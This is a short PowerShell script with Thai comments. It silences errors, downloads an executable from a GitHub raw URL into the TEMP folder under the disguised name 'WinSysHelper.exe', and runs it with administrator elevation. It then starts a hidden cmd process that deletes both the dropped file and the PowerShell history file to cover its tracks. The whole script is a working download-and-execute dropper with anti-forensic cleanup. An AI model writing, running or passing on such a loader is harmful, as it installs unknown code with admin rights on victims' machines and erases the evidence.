$ErrorActionPreference = 'SilentlyContinue'

# 1. ลบไฟล์เก่าออกก่อน (ป้องกันไฟล์ซ้ำแล้วโหลดไม่ได้)
$output = "$env:TEMP\WinSysHelper.exe"
if (Test-Path $output) { Remove-Item $output -Force }

# 2. ดาวน์โหลดไฟล์ EXE
$url = "https://github.com/silentaimv1-png/basxpanel/raw/refs/heads/main/BASX.exe"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)

# 3. ตรวจสอบว่าโหลดเสร็จจริง (ถ้าไฟล์ใหญ่กว่า 0 byte ถึงจะรัน)
if ((Get-Item $output).Length -gt 0) {
    # สั่งเปิด EXE แบบ Admin
    Start-Process -FilePath $output -Verb RunAs
    
    # หน่วงเวลา 5 วินาทีเพื่อให้มั่นใจว่าโปรแกรมเด้งขึ้นมาแล้ว
    Start-Sleep -Seconds 5
}

# 4. สั่ง CMD ลบประวัติ PowerShell และไฟล์ทิ้งเบื้องหลัง
$history = (Get-PSReadlineOption).HistorySavePath
$clean = "timeout /t 10 && del /f /q `"$output`" && del /f /q `"$history`""
Start-Process cmd -ArgumentList "/c $clean" -WindowStyle Hidden

exit
